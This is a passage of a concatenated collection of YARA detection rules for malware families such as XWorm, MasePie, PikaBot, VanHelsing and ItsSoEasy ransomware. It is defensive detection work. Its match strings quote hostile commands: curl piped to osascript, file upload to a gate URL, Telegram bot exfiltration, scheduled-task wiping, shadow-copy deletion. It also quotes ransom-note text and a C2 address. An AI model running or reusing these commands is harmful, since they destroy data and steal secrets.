		$str_3 = "icompleted" ascii fullword
		$str_4 = "icomplete.exe" ascii fullword
	condition:
		3 of ($str_*)
}


// ===== Source: yaraify-rules/xwormStealer.yar =====
rule xwormStealer {

  meta:
      author = "Jeffrey Farnan"
      description = " Infostealer / backdoor"
      date = "2024-04-11"
      yarahub_author_twitter = "@jeffrey_farnan"
      yarahub_author_email = "jfarnan@opentext.com"
      yarahub_reference_link = "https://twitter.com/jeffrey_farnan"
      yarahub_reference_md5 = "ff9e45d7326698f34526793bf1244811"
      yarahub_uuid = "c535499f-a603-4178-a069-8c70ccc3fbc7"
      yarahub_license = "CC0 1.0"
      yarahub_rule_matching_tlp = "TLP:WHITE"
      yarahub_rule_sharing_tlp = "TLP:WHITE"
      malpedia_family = "XWorm"

strings:


	$s1 = "OPHt.exe"
	$s2 = "cserver=40.76.205.114"
	$s3 = "$14fd9586-59f9-419a-91fa-4fec2c6f81f6"
	

condition:
	2 of ($s*)


}


// ===== Source: yaraify-rules/ClipperDLL_Amadey.yar =====
rule ClipperDLL_Amadey {
    meta:
        author = "NDA0E"
        yarahub_author_twitter = "@NDA0E"
        date = "2024-10-19"
        description = "Detects Amadey's Clipper DLL"
        yarahub_uuid = "6185c299-b3fe-4a8a-99f8-be4128566163"
        yarahub_license = "CC0 1.0"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp = "TLP:WHITE"
        yarahub_reference_md5 = "fc4faaa0d820e943dbf1235a84ae165e"
        malpedia_family = "win.amadey"

    strings:
        $ClipperDLL = "??4CClipperDLL@" ascii
        $CLIPPERDLL_dll = "CLIPPERDLL.dll" ascii

    condition:
        uint16(0) == 0x5a4d and
	any of them
}


// ===== Source: yaraify-rules/Python_MasePie.yar =====
rule Python_MasePie
{
  meta:
    author = "Yashraj Solanki - Cyber Threat Intelligence Analyst at Bridewell"
    description = "Detects the Masepie malware Python script based on matched strings"
    author = "Yashraj Solanki - Cyber Threat Intelligence Analyst at Bridewell"
    source = "https://cert.gov.ua/article/6276894"
    hash = "18f891a3737bb53cd1ab451e2140654a376a43b2d75f6695f3133d47a41952b6"
    date = "2024-01-19"
    yarahub_author_twitter = "@RustyNoob619"
    yarahub_reference_md5 = "47f4b4d8f95a7e842691120c66309d5b"
    yarahub_uuid = "21490ae6-79ce-4fe2-89bf-c4ea66931336"
    yarahub_license = "CC0 1.0"
    yarahub_rule_matching_tlp = "TLP:WHITE"
    yarahub_rule_sharing_tlp = "TLP:WHITE"
    malpedia_family = "py.masepie"
    
  strings:
    $msg1 = "message == 'check'"
    $msg2 = "message == 'send_file'"
    $msg3 = "message == 'get_file'"
    $clnt1 = "client.sendall(enc_answer)"
    $clnt2 = "client.recv(1024).decode()"
    $clnt3 = "client.sendall(bytes_enc)"
    $clnt4 = "client.send(okenc)"
    $clnt5 = "client.send(enc_answ)"
    $clnt6 = "client.send(user.encode('ascii'))"
    $clnt7 = "client.recv(1024)"
    $clnt8 = "client2.send('Error transporting file'.encode())"
    $clnt9 = "client2.recv(BUFFER_SIZE)"
    $clnt10 = "client2.send(ok_enc)"
    $othr1 = "enc_mes('ok', k)"
    $othr2 = "receive_file_thread.start()"
    $othr3 = "threading.Thread(target=receive_file)"
    $othr4 = "dec_mes(enc_received, k).decode()"
    $othr5 = "socket.socket(socket.AF_INET, socket.SOCK_STREAM)"
    $othr6 = "cypher.encrypt(pad(mes, cypher_block))"
    $othr7 = "ES.new(key.encode(), AES.MODE_CBC, key.encode())"

  condition:
    all of ($msg*)
    and 6 of ($clnt*)
    and 4 of ($othr*)
}


// ===== Source: yaraify-rules/CVE_2026_21509_RTF_ShellExplorer.yar =====
rule CVE_2026_21509_RTF_ShellExplorer
{
    meta:
        description = "Detect RTF exploiting CVE-2026-21509 via Shell.Explorer.1 OLE object"
        cve = "CVE-2026-21509"
        exploit_primitive = "Shell.Explorer.1 OLE allowlist gap"
        technique = "RTF embedded OLE -> Shell.Explorer.1 -> Navigate()"
        delivery = "Remote LNK"
        actor = "APT28 / Others"
        confidence = "high"
        author = "Robin Dost"
        reference = "https://blog.synapticsystems.de/apt28-geofencing-as-a-targeting-signal-cve-2026-21509/"
        date = "2026-02-03"
        notes = "Valid OLE object. Exploit relies on allowlist gap."
        yarahub_author_twitter = "@Mr128BitSec"
        yarahub_author_email = "robin.dost@synapticsystems.de"
        yarahub_reference_md5 = "4727582023cd8071a6f388ea3ba2feaa"
        yarahub_uuid = "bf2bf9db-ab13-4138-993d-bffcac1b84fc"
        yarahub_license = "CC BY-SA 4.0"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp = "TLP:WHITE"

    strings:
        $rtf = "{\\rtf" // is rtf?
        $objocx = "\\objocx"
        $objclass = "Word.Document.12" ascii
        $shell_hex = "C32AB2EAC130CF11A7EB0000C05BAE0B" ascii // detect guid
    
    condition:
        $rtf and
        $objocx and
        $objclass and
        $shell_hex
}


// ===== Source: yaraify-rules/INDICATOR_SUSPICIOUS_Go_Infostealer_Discord_Generic.yar =====
rule INDICATOR_SUSPICIOUS_Go_Infostealer_Discord_Generic
{
    meta:
        description = "Detects a Go-based infostealer that targets Discord tokens by locating the 'Local State' file, decrypting the master key with DPAPI, and exfiltrating tokens."
        author = "Yara Rule Generator"
        date = "2023-10-27"
        reference = "Internal analysis of decompiled code. Generic version."
        malware_family = "GoDiscordStealer"
        hash = "N/A - Rule based on provided code snippets"
        yarahub_reference_md5 = "78357375735734775475747574757454"
        yarahub_uuid = "2a763267-af58-46e3-9d77-b6de01f25648"
        yarahub_license = "CC0 1.0"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp = "TLP:WHITE"

    strings:
        // Core download and execute pattern
        $cmd_dl_exec1 = "curl -k -s -H \"api-key: %s\"" ascii wide
        $cmd_dl_exec2 = "| osascript" ascii wide

        // Exfiltration pattern
        $cmd_exfil1 = "-F \"file=@/tmp/osalogging.zip\"" ascii wide
        $cmd_exfil2 = "-F \"buildtxd=%s\"" ascii wide
        $cmd_exfil3 = "https://%s/gate" ascii wide

        // Other suspicious strings
        $str_kill = "killall Terminal" ascii wide
        $str_uri = "/dynamic?txd=%s" ascii wide

    condition:
        // Check for Mach-O 64-bit magic bytes
        uint32(0) == 0xfeedfacf and
        (
            // High confidence: The core download, execute, and exfiltration logic is present
            (all of ($cmd_dl*)) and (1 of ($cmd_exfil*))
        ) or
        (
            // Medium confidence: The download/execute pattern plus another indicator
            (all of ($cmd_dl*)) and (1 of ($str*))
        )
}


// ===== Source: yaraify-rules/smokedham_installer.yar =====
rule smokedham_installer {
  meta:
    date = "2025-05-12"
    target_entity = "file"
    yarahub_uuid = "aab6710b-9c4a-4f82-ba7d-27fcabb37f86"
    yarahub_license = "CC0 1.0"
    yarahub_rule_matching_tlp = "TLP:WHITE"
    yarahub_rule_sharing_tlp = "TLP:WHITE"
    yarahub_reference_md5 = "b587a6af7fd86eeb42425913b8d73d47"
  strings:
    $string1 = "VirtManage Pro" wide ascii
    $string2 = "NullsoftInst" wide ascii
  condition:
    uint16(0) == 0x5A4D and all of them
}


// ===== Source: yaraify-rules/PikaBot_Stage1_20240222.yar =====
rule PikaBot_Stage1_20240222
{
	meta:
		author = "Nicholas Dhaeyer - @DhaeyerWolf"
		date_created = "2024-03-11"
		date_last_modified = "2024-03-11"
		description = "Attempts to identify common strings used in a stage 1 Pikabot maldoc. During the infection, the malicious .js file this rule attempts to detect was observed in a ZIP file."
		yarahub_uuid = "9c58db83-6b79-40f2-bb2f-14f3850306c5"
		date = "2024-03-11"
		yarahub_author_twitter = "@DhaeyerWolf"
		yarahub_license = "CC BY-SA 4.0"
		yarahub_rule_matching_tlp = "TLP:WHITE"
		yarahub_rule_sharing_tlp = "TLP:WHITE"
		yarahub_reference_md5 = "1ab44b19be472634d648de85991aefeb"
		malpedia_family = "win.pikabot"

    strings:
		$start = "$ = " //script starts with definition of a variable.
		
		$s_fromCharCode = "\\x66\\x72\\x6F\\x6D\\x43\\x68\\x61\\x72\\x43\\x6F\\x64\\x65" 	//fromCharCode
		$s_forEach = "\\x66\\x6F\\x72\\x45\\x61\\x63\\x68" 						//forEach
		$s_charAt = "\\x63\\x68\\x61\\x72\\x41\\x74" 							//charAt
		$s_split = "\\x73\\x70\\x6C\\x69\\x74" 								//split
		$s_replace = "\\x72\\x65\\x70\\x6C\\x61\\x63\\x65" 						//replace
		$s_slice = "\\x73\\x6C\\x69\\x63\\x65" 								//slice
		$s_prototype = "\\x70\\x72\\x6F\\x74\\x6F\\x74\\x79\\x70\\x65"				//prototype
		$s_call = "\\x63\\x61\\x6C\\x6C" 									//call
		$s_length = "\\x6C\\x65\\x6E\\x67\\x74\\x68" 							//length
		

    condition:
		$start at 0 and 1 of ($s_*)
}


// ===== Source: yaraify-rules/win_xfiles_stealer_a8b373fb.yar =====
rule win_xfiles_stealer_a8b373fb {

    meta:
        author                    = "Johannes Bader"
        date                      = "2022-04-15"
        description               = "detects XFiles-Stealer"
        hash                      = "d06072f959d895f2fc9a57f44bf6357596c5c3410e90dabe06b171161f37d690"
        hash2                     = "1ed070e0d33db9f159a576e6430c273c"
        malpedia_family           = "win.xfilesstealer"
        tlp                       = "TLP:WHITE"
        version                   = "v1.0"
        yarahub_author_email      = "yara@bin.re"
        yarahub_author_twitter    = "@viql"
        yarahub_license           = "CC BY-SA 4.0"
        yarahub_reference_md5     = "1ed070e0d33db9f159a576e6430c273c"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp  = "TLP:WHITE"
        yarahub_uuid              = "a8b373fb-337a-4c3c-9387-78c294c8017d"

    strings:
        $ad_1 = "Telegram bot - @XFILESShop_Bot" wide
        $ad_2 = "Telegram support - @XFILES_Seller" wide

        $names_1 = "XFiles.Models.Yeti"
        $names_2 = "anti_vzlom_popki" // анти взлом попки
        $names_3 = "assType"
        $names_4 = "hackrjaw"

        $upload_1  = "zipx" wide
        $upload_2  = "user_id" wide
        $upload_3  = "passworlds_x" wide
        $upload_4  = "ip_x" wide
        $upload_5  = "cc_x" wide
        $upload_6  = "cookies_x" wide
        $upload_7  = "zip_x" wide
        $upload_8  = "contry_x" wide
        $upload_9  = "tag_x" wide
        $upload_10 = "piece" wide

    condition:
        uint16(0) == 0x5A4D and
        (
            all of ($ad_*) or
            all of ($names_*) or
            all of ($upload_*)
        )
}


// ===== Source: yaraify-rules/MAL_JS_Gootloader_jQuery_Compactv2_17Dec24.yar =====
rule MAL_JS_Gootloader_jQuery_Compactv2_17Dec24 {
	meta:		
		description = "Detects malicious Gootloader JS hidden in the Query Compat JavaScript Library v3.0.0-alpha1"
		author = "@Gootloader"
		date = "2024-12-17"
		tlp = "CLEAR"
		yarahub_reference_md5 = "95238ad5a91d721c6e8fdf4c36187798"
		yarahub_uuid = "7330bdd3-38ae-437d-bcc8-d750f2363048"
		yarahub_license = "CC BY 4.0"
		yarahub_rule_matching_tlp = "TLP:WHITE"
		yarahub_rule_sharing_tlp = "TLP:WHITE"
		malpedia_family = "js.gootloader"
	strings:		
		$string1 = "jQuery Compat JavaScript Library v3.0.0-alpha1"
		$string2 = "');"
		
	condition:
		#string1 >= 1
		and #string2 >= 1
		and all of them
}


// ===== Source: yaraify-rules/gorilla_bot.yar =====
rule gorilla_bot
{
    meta:
        description = "Detects GorillaBot runtime strings"
        author = "asyncthecat"
        date = "2025-11-08"
        yarahub_author_twitter = "@asyncthecat"
        yarahub_author_email = "asyncthecat@mailhaven.su"
        yarahub_reference_md5 = "a650c998b6d2272aa51314461d7949ef"
        yarahub_uuid = "ea5f03a1-3ab6-4bbe-b8b0-a643d92a6776"
        yarahub_license = "CC BY-SA 4.0"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp = "TLP:WHITE"

    strings:
        $s1 = "Found And Killed Process: PID=%d, Realpath=%s" ascii
        $s2 = "arm.nn" ascii
        $s3 = "arm5.nn" ascii
        $s4 = "arm6.nn" ascii
        $s5 = "m68k.nn" ascii
        $s6 = "mips.nn" ascii
        $s7 = "mipsel.nn" ascii
        $s8 = "powerpc.nn" ascii
        $s9 = "sparc.nn" ascii

    condition:
        any of ($s*)
}


// ===== Source: yaraify-rules/MaksStealer_Loader.yar =====
rule MaksStealer_Loader {
  meta:
    author = "ShadowOpCode"
    description = "Detects MaksStealer dropper/loader JAR"
    last_modified = "2025-05-18"
    date = "2025-08-19"
    yarahub_uuid = "37ece914-8bcd-4c6f-931b-9d42de974055"
    yarahub_license = "CC0 1.0"
    yarahub_rule_matching_tlp = "TLP:WHITE"
    yarahub_rule_sharing_tlp = "TLP:WHITE"
    yarahub_reference_md5 = "00000000000000000000000000000000"

  strings:
    $s0 = "MaxCoffe" ascii nocase

  condition:
    uint16be(0) == 0x504B and
    $s0
}


// ===== Source: yaraify-rules/MX_fin_custom_allakore_rat.yar =====
rule MX_fin_custom_allakore_rat {
    meta:
        author = "BlackBerry Threat Research & Intelligence Team"
        description = "Find MX fin custom function names and prefixes."
        date = "2023-12-19"
        yarahub_uuid = "1ae525ed-ef60-408c-8b61-0bec8b5a9828"
        yarahub_reference_md5 = "33cc3be935639f1e0d1d7483b8286d7c"
        yarahub_license = "CC0 1.0"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp = "TLP:WHITE"
    strings:
        $main = "<|MAINSOCKET|>"
        $cnc1 = "<|MANDAFIRMA|>"
        $cnc2 = "<|FIRMASANTA|>"
        $cnc3 = "<|MENSAJE" wide
        $cnc4 = "<|DESTRABA" wide
        $cnc5 = "<|TOKEN" wide
        $cnc6 = "<|TRABAR" wide
        $cnc7 = "<|USU" wide
        $cnc8 = "<|ACTUALIZA|>" wide
        $cnc9 = "<|BANA" wide
        $cnc10 = "<|CLAVE" wide
    condition:
      uint16(0) == 0x5A4D and $main and 2 of ($cnc*) and filesize > 5MB and filesize < 12MB
}


// ===== Source: yaraify-rules/xlsb_rule.yar =====
rule xlsb_rule 
{
    meta:
        description = "Regla para correo malicioso"
        author = "Nerio Rodriguez"
        date = "2024-04-15"
	yarahub_uuid = "5ba6c7f5-1c25-46ef-9904-60a78716d140"
        yarahub_reference_md5 = "c2293ce082da26ff050854765bcd0870"
	yarahub_license = "CC0 1.0"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp = "TLP:WHITE"
    strings:
        $s1 = "d5f1edd399916227c8551ba8dcd2bd47a1302130db64f2526dbeaa58981dbf45" wide ascii
        $s2 = "c2293ce082da26ff050854765bcd0870" wide ascii
    condition:
        all of them
}


// ===== Source: yaraify-rules/MythStealerLoader.yar =====
rule MythStealerLoader {
	meta:
		author = "Still"
		component_name = "MythStealer"
		date = "2025-06-13"
		description = "attempts to match the strings/instructions found in MythStealer loader; this is a very loose rule and may match fp"
		yarahub_author_twitter = "@AzakaSekai_"
		yarahub_license = "CC BY-NC 4.0"
		yarahub_reference_md5 = "7a98967deb6b10311ab6d12e8bd5a144"
		yarahub_rule_matching_tlp = "TLP:WHITE"
		yarahub_rule_sharing_tlp = "TLP:WHITE"
		yarahub_uuid = "a4702e4d-51fc-42f3-9813-fe26de5b9452"
	strings:
		$str_1 = "loader\\src\\main.rs" ascii
		$str_2 = "PeLoaderErr" ascii
		$str_3 = "memexec" ascii
	condition:
		all of them
}


// ===== Source: yaraify-rules/ItsSoEasy_Ransomware_C_Var.yar =====
rule ItsSoEasy_Ransomware_C_Var {
    meta:
		description = "Detect ItsSoEasy Ransomware (Itssoeasy-A C.Var)"
		author = "bstnbuck"
		date = "2023-11-02"
        yarahub_author_twitter = "@bstnbuck"
        yarahub_reference_link = "https://github.com/bstnbuck/ItsSoEasy"
        yarahub_uuid = "ad8b93fa-22bc-4c2a-b15f-35462f85d944"
        yarahub_license = "CC0 1.0"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp = "TLP:WHITE"
        yarahub_reference_md5 = "1ce280542553dc383b768b9189808e27"
    
	strings:
		$typ1 = "itssoeasy" nocase
		$typ1_wide = "itssoeasy" nocase wide
		$typ2 = "itssoeasy" base64
		$typ3 = "ItsSoEasy" base64

		// C2 communication message strings
		// well this sucks, ha!
		$c2m1 = "d2VsbCB0aGlzIHN1Y2tzLCBoYSE="  
		// has this idiot payed the ransom?               
		$c2m2 = "aGFzIHRoaXMgaWRpb3QgcGF5ZWQgdGhlIHJhbnNvbT8="
		// oh, you're good!
		$c2m3 = "b2gsIHlvdSdyZSBnb29kIQ=="          
		// money, money, money!           
		$c2m4 = "bW9uZXksIG1vbmV5LCBtb25leSE="        
		// i need this to fuck you up!         
		$c2m5 = "aSBuZWVkIHRoaXMgdG8gZnVjayB5b3UgdXAh"   
		// --KEY-PROCEDURE--      
		$c2m6 = "LS1LRVktUFJPQ0VEVVJFLS0="                     
		
		// Base64 encoded message strings
		// Decrypt files now?
		$tkmsgMsg = "RGVjcnlwdCBmaWxlcyBub3c/"
		// Whoops your personal data was encrypted! Read the index.html on the Desktop how to decrypt it
		$tkmsg1Msg = "V2hvb3BzIHlvdXIgcGVyc29uYWwgZGF0YSB3YXMgZW5jcnlwdGVkISBSZWFkIHRoZSBpbmRleC5odG1sIG9uIHRoZSBEZXNrdG9wIGhvdyB0byBkZWNyeXB0IGl0"
		// Now your data is lost
		$tkmsg2Msg = "Tm93IHlvdXIgZGF0YSBpcyBsb3N0" 
		// It was as easy as I said, ha?
		$tkmsg3Msg = "SXQgd2FzIGFzIGVhc3kgYXMgSSBzYWlkLCBoYT8=" 

		// file names and typical ransom filetype
		$fileFiles = "L2lmX3lvdV9jaGFuZ2VfdGhpc19maWxlX3lvdXJfZGF0YV9pc19sb3N0" // /if_you_change_this_file_your_data_is_lost
		// /identifier
		$fileident = "L2lkZW50aWZpZXI=" 
		// .itssoeasy                                        
		$filetype = "Lml0c3NvZWFzeQ==" 
		$fileransom = "itssoeasy.html"

		// CMD print messages
		$cmd1 = "Welcome to the Google connector!\nPlease wait while the installer runs..."
		$cmd2 = "Do not destroy the current process, otherwise your data will be irreversibly encrypted."
		$cmd3 = "Please use the instructions in the .html file on your Desktop or your Home-Directory to decrypt your data"
		$cmd4 = "If you payed, this window will automatically check and decrypt your data."
		$cmd5 = "Wow! You're good. Now i will recover your files!\n => Do not kill this process, otherwise your data is lost!"
		$cmd6 = "Your files has been decrypted!\nThank you and Goodbye."

    condition:
        any of ($typ*) and all of ($c2*, $tkmsg*, $file*, $cmd*) and (filesize < 100KB or (filesize > 1MB and filesize < 3MB))
}


// ===== Source: yaraify-rules/VBS_Gamaredon_GamaWiper_Cleanup_Disruption_2025_12.yar =====
rule VBS_Gamaredon_GamaWiper_Cleanup_Disruption_2025_12
{
  meta:
    description = "Detects VBScript cleanup/disruption tool wiping HKCU persistence, deleting C:\\Users recursively, deleting scheduled tasks, and killing script processes"
    author = "Robin Dost"
    date = "2025-12-23"
    reference = "User-provided script"
    confidence = "high"
    tags = "vbs, wscript, cleanup, disruption, persistence-removal"
    yarahub_author_twitter = "@Mr128BitSec"
    yarahub_author_email = "robin.dost@synapticsystems.de"
    yarahub_reference_md5 = "4de669a86175e24bcd26c451240b6fa0"
    yarahub_uuid = "96b89a92-1d5f-4cc5-b606-64963117c4fa"
    yarahub_license = "CC0 1.0"
    yarahub_rule_matching_tlp = "TLP:WHITE"
    yarahub_rule_sharing_tlp = "TLP:WHITE"

  strings:
    // VBScript / COM primitives
    $wshell = "WScript.Shell" ascii wide
    $fso    = "Scripting.FileSystemObject" ascii wide
    $stdreg = "StdRegProv" ascii wide
    $wmi1   = "winmgmts:\\\\.\\root\\default:StdRegProv" ascii wide
    $wmi2   = "root\\cimv2" ascii wide
    $query  = "Select * from Win32_Process Where Name = "

    // Targeted persistence keys
    $run    = "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\" ascii wide
    $runonce= "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\" ascii wide
    $impersonate = "impersonationLevel=impersonate"
    // Scheduled task wipe
    $scht   = "cmd /c schtasks /delete /tn * /f" ascii wide

    // User directory wipe
    $users  = "C:\\Users" ascii wide
    $delrec = "DeleteFilesRecursively" ascii wide
    $filedel= "file.Delete True" ascii wide

    // Registry walk + delete
    $walk   = "WalkRegistry" ascii wide
    $regread= "objShell.RegRead" ascii wide
    $regdel = "objShell.RegDelete" ascii wide
    $hkcu   = "&H80000001" ascii wide

    // Process kill via WMI
    $q_ps   = "Select * from Win32_Process Where Name = 'powershell.exe'" ascii wide
    $q_ws   = "Select * from Win32_Process Where Name = 'wscript.exe'" ascii wide
    $q_cs   = "Select * from Win32_Process Where Name = 'cscript.exe'" ascii wide
    $q_ms   = "Select * from Win32_Process Where Name = 'mshta.exe'" ascii wide
    $term   = ".Terminate()" ascii wide

  condition:
    // Ensure it's a VBS script-ish file plus the unique behavior combo
    (
      $wshell and $regdel and $query and $impersonate and
      $fso and $stdreg and $wmi1 and
      ( $run or $runonce ) and
      $scht and
      $users and $delrec and $filedel and
      $wmi2 and $term and
      2 of ($q_ps, $q_ws, $q_cs, $q_ms) and
      ( $walk and $regread and $hkcu )
    )
}


// ===== Source: yaraify-rules/BrowserExtensionLoader.yar =====
rule BrowserExtensionLoader {
    meta:
        author = "NDA0E"
        yarahub_author_twitter = "@NDA0E"
        date = "2024-11-08"
        description = "Detects Chrome/Edge browser extension loader"
        yarahub_uuid = "9aa9f2aa-f3e3-4068-a7ca-17b89cfd03d4"
        yarahub_license = "CC BY 4.0"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp = "TLP:WHITE"
        yarahub_reference_md5 = "6c51dde7b67ecdd5b5ba4db58542a0a4"
    
    strings:
        $proc_chrome = "chrome.exe" wide ascii
        $proc_edge = "msedge.exe" wide ascii
        
        $cmd_kill = "taskkill /IM %s /F" wide ascii
        $cmd_load = "--load-extension" wide ascii
        $cmd_restore = "--restore-last-session" wide ascii
        
        $path_chrome = "\\AppData\\Local\\Google\\Chrome" wide ascii
        $path_chrome_beta = "\\AppData\\Local\\Google\\Chrome Beta" wide ascii
        $path_edge = "\\AppData\\Local\\Microsoft\\Edge" wide ascii
        
    condition:
        uint16(0) == 0x5a4d and
        (any of ($proc*) and 
        all of ($cmd*) and 
        any of ($path*))
}


// ===== Source: yaraify-rules/dependsonpythonailib.yar =====
rule dependsonpythonailib {
  meta:
    author = "Tim Brown"
    yarahub_author_twitter = "@timb_machine"
    description = "Hunts for dependencies on Python AI libraries"
    date = "2025-05-10"
    yarahub_reference_md5	= "b0275236f4d75d4825e4d0f02bc89064"
    yarahub_uuid = "e06804d6-635e-44d9-9b32-6829e38a9990"
    yarahub_license = "CC BY 4.0"
    yarahub_rule_matching_tlp = "TLP:WHITE"
    yarahub_rule_sharing_tlp = "TLP:WHITE"
  strings:
    $torch = "torch"
    $tensorflow = "tensorflow"
    $numpy = "numpy"  
    $scipy = "scipy"
    $matplotlib = "matplotlib"
    $pandas = "pandas"
    $transformers = "transformers"
    $langchain = "langchain"
  condition:
    $torch or $tensorflow or $numpy or $scipy or $matplotlib or $pandas or $transformers or $langchain
}


// ===== Source: yaraify-rules/BadIIS_JKornevHidden.yar =====
rule BadIIS_JKornevHidden {
	meta:
		author = "Still"
		component_name = "JKornevHidden"
		date = "2025-09-20"
		description = "attempts to match the strings found in BadIIS variant of the JKornevHidden rootkit"
		yarahub_author_twitter = "@AzakaSekai_"
		yarahub_license = "CC BY-NC 4.0"
		yarahub_reference_md5 = "2965ddbcd11a08a3ca159af187ef754c"
		yarahub_rule_matching_tlp = "TLP:WHITE"
		yarahub_rule_sharing_tlp = "TLP:WHITE"
		yarahub_uuid = "2ad4b588-51c4-4c64-ac24-de6f75047619"
	strings:
		$str_1 = "_Zhuangtai" wide
		$str_2 = "_YinshenMode" wide
		$str_3 = "_WinkbjRegValues" wide
		$str_4 = "_FangxingImages" wide
		$str_5 = "_BaohuImages" wide
		$str_6 = "[HahaDbg]" wide ascii
		$str_7 = "\\\\DosDevices\\\\WinkbjDamen" wide 
	condition:
		3 of them
}


// ===== Source: yaraify-rules/VanHelsing_Ransomware.yar =====
rule VanHelsing_Ransomware {
    meta:
        description = "Detects VanHelsing Ransomware using file markers and behaviors"
        author = "Vasilis Orlof"
        reference = "https://research.checkpoint.com/2025/vanhelsing-new-raas-in-town/"
        date = "2025-03-27"
        hash1 = "79106dd259ba5343202c2f669a0a61b10adfadff" 
        hash2 = "e683bfaeb1a695ff9ef1759cf1944fa3bb3b6948" 
        yarahub_uuid = "e57e6137-99e4-46f7-ba7b-131490fdb0d8"
        yarahub_license = "CC0 1.0"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp = "TLP:WHITE"
        yarahub_reference_md5 = "6f6cc222f3a1886191407a0eaa8b7b83"
    
    strings:
        // Filenames that are dropped by the ransomware
        $filename1 = "vhlocker.png" ascii wide
        $filename2 = "vhlocker.ico" ascii wide
        
        // Strings from the ransom note
        $note1 = "Your network has been breached" ascii wide
        $note2 = "README.txt" ascii wide
        
        // Command line arguments the ransomware supports
        $arg1 = "--no-mounted" ascii wide
        $arg2 = "--no-network" ascii wide
        $arg3 = "--spread-smb" ascii wide
        $arg4 = "--Silent" ascii wide
        $arg5 = "--skipshadow" ascii wide
        
        // File path from PDB as mentioned in the report
        $pdb = "1-locker.pdb" ascii wide
        
        // Embedded code/directory references
        $dir1 = "C:\\Windows\\Web" ascii wide
        $cmd1 = "cmd.exe /c C:\\Windows\\System32\\wbem\\WMIC.exe shadowcopy where" ascii wide
        
        // Mutex name
        $mutex = "Global\\VanHelsing" ascii wide
        
        // Encryption markers
        $encmarker1 = "---key---" ascii wide
        $encmarker2 = "---endkey---" ascii wide
        $encmarker3 = "---nonce---" ascii wide
        $encmarker4 = "---endnonce---" ascii wide
        
    condition:
        uint16(0) == 0x5A4D and // PE file signature
        (
            // Match key ransomware functionality indicators
            (any of ($filename*)) or
            (3 of ($arg*)) or
            // File format markers
            (2 of ($encmarker*)) or
            // Other strong indicators
            ($pdb) or
            ($mutex) or
            // Command execution patterns
            ($cmd1) or
            // Multiple indicators of various types
            (($dir1) and ($note1 or $note2))
        )
}


// ===== Source: yaraify-rules/Chinese_APT_Backdoor.yar =====
rule Chinese_APT_Backdoor
{
	meta: 
		date = "2023-09-11"
		yarahub_uuid = "b11b03a5-e30b-4587-bd53-77f5202dae09"
		yarahub_license = "CC0 1.0"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp = "TLP:WHITE"
        yarahub_reference_md5 = "c90459986070e38fd8260d4430e23dfd"
		author = "schmidtsz"
		description = "Identify Chinese APT Backdoor"
		
  strings:
    $0 = "_getportpoop"
    $1 = "_portpoop"
    $2 = "_gethostpoop"
    $3 = "_ding2"
	$4 = "_ding1"
	$5 = "_o_alla"
	$6 = "_holler"
	
  condition:
	all of them
}


// ===== Source: yaraify-rules/detect_braodo_stealer.yar =====
rule detect_braodo_stealer {

meta: 
    author = "Priya"
    description = "This rule detects Broaodo Stealer"
    date = "2024-10-02"
    yarahub_reference_md5 = "e7f57ef84d7c3ab8fbdb985d5bc7735c"
    yarahub_uuid = "2b7264f6-0af4-4d95-8009-7a9a4cf1871f"
    yarahub_license = "CC0 1.0"
    yarahub_rule_matching_tlp = "TLP:WHITE"
    yarahub_rule_sharing_tlp = "TLP:WHITE"

strings:
    $string_one = "cookiefb.txt"
    $string_two = "https://api.telegram.org/bot"
    $string_three = "taskkill /f /im chrome.exe"
    $string_four = "logins.json"
    $string_five = "https://ipinfo.io"
	


condition:
    (3 of them) or (all of them)



}


// ===== Source: yaraify-rules/recordbreaker_win_generic.yar =====
rule recordbreaker_win_generic
{
	meta:
		author = "_kphi"
		date = "2022-09-10"
		yarahub_uuid = "29b92b37-a135-4ca0-beeb-ef8401ed458f"
		yarahub_license = "CC0 1.0"
		yarahub_rule_matching_tlp = "TLP:WHITE"
		yarahub_rule_sharing_tlp = "TLP:WHITE"
		yarahub_reference_md5 = "38edeba93cc729b7099d74a7780d4dd6"

	strings:
		$a1 = "GetEnvironmentVariable"
		$a2 = "GetLogicalDriveStrings"
		$a3 = "GetSystemWow64Directory"
		$a4 = "GlobalMemoryStatusEx"
		$a5 = "DeleteFile"
		$a6 = "FindFirstFile"
		$a7 = "FindNextFile"
		$a8 = "CreateToolhelp32Snapshot"
		$a9 = "OpenProcess"
		$a10 = "Process32First"
		$a11 = "Process32Next"
		$a12 = "SetCurrentDirectory"
		$a13 = "SetEnvironmentVariable"
		$a14 = "WriteFile"
		$a15 = "ShellExecute"
		$a16 = "CreateProcessWithToken"
		$a17 = "DuplicateTokenEx"
		$a18 = "OpenProcessToken"
		$a19 = "SystemFunction036"
		$a20 = "EnumDisplayDevices"
		$a21 = "GetDesktopWindow"
		$a22 = "CryptStringToBinary"
		$a23 = "CryptStringToBinary"
		$a24 = "CryptBinaryToString"
		$a25 = "CryptUnprotectData"
		$a26 = "InternetConnect"
		$a27 = "InternetOpen"
		$a28 = "InternetSetOption"
		$a29 = "InternetOpenUrl"
		$a30 = "InternetOpenUrl"
		$a31 = "InternetReadFileEx"
		$a32 = "InternetReadFile"
		$a33 = "InternetCloseHandle"
		$a34 = "HttpOpenRequest"
		$a35 = "HttpSendRequest"
		$a36 = "HttpQueryInfo"
		$a37 = "HttpQueryInfo"

		$b1 = "GetProcAddress"
		$b2 = "LoadLibraryW"

		$c1 = "ffcookies.txt" wide
		$c2 = "wallet.dat" wide
		
	condition:
		uint16(0) == 0x5A4D
		and 30 of ($a*)
		and any of ($b*)
		and any of ($c*)
}


// ===== Source: yaraify-rules/Suspicious_Golang_Binary.yar =====
